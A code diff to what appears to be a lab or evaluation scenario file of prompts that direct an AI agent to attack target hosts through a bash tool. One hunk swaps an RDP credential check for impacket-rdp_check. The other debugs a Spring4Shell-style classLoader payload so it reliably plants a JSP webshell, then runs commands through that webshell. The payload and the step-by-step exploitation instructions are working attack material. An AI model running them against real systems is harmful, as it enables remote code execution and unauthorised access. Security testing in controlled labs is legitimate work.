@@ -1667,7 +1667,7 @@ SCENARIOS: dict[str, dict] = {
             "Use execute_bash for each step. "
             "(1) call execute_bash with cmd='nmap -sV -p $TARGET_PORT --script rdp-enum-encryption $TARGET_HOST 2>&1 | head -35' "
             "to fingerprint RDP and its security modes, "
-            '(2) call execute_bash with cmd=\'nxc rdp $TARGET_HOST -u "$LAB_META3_USER" -p "$LAB_META3_PASS" 2>&1 | head -20\' '
+            "(2) call execute_bash with cmd='impacket-rdp_check \"$LAB_META3_USER:$LAB_META3_PASS@$TARGET_HOST\" 2>&1 | head -20' "
             "to validate the documented standard Windows credentials without opening an interactive desktop. "
             "Report only observed service and authentication evidence. "
             "Do not execute commands or change the target. Do not describe — call the tools."
@@ -2270,10 +2270,14 @@ SCENARIOS: dict[str, dict] = {
             "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
             "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
             "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
-            "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= "
+            # The value must be truly empty. A trailing space becomes part of
+            # Tomcat's filename (``tomcatwar .jsp``), so the documented follow-
+            # up request to /tomcatwar.jsp can never reach the planted shell.
+            "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
             "-- also set headers `suffix: %>//`, `c1: Runtime`, `c2: <%` on this request (these are used inside the "
-            "pattern above). (3) In the SAME execute_bash call, immediately GET the planted webshell with a real "
-            "command: $TARGET_HOST:$TARGET_PORT/tomcatwar.jsp?pwd=j&cmd=id -- capture and print the full response body "
+            "pattern above). (3) In the SAME execute_bash call, wait three seconds for Tomcat's access log to flush, "
+            "then GET the planted webshell with a real command (retry for up to ten seconds while Tomcat compiles it): "
+            "$TARGET_HOST:$TARGET_PORT/tomcatwar.jsp?pwd=j&cmd=id -- capture and print the full response body "
             "(do not discard it). The webshell writes the command's stdout directly into the HTTP response via "
             "out.println(), so `id`'s real output (e.g. uid=...(...) gid=...(...)) should appear directly -- no "
             "blind/callback trick needed. Do not describe — call the tools."
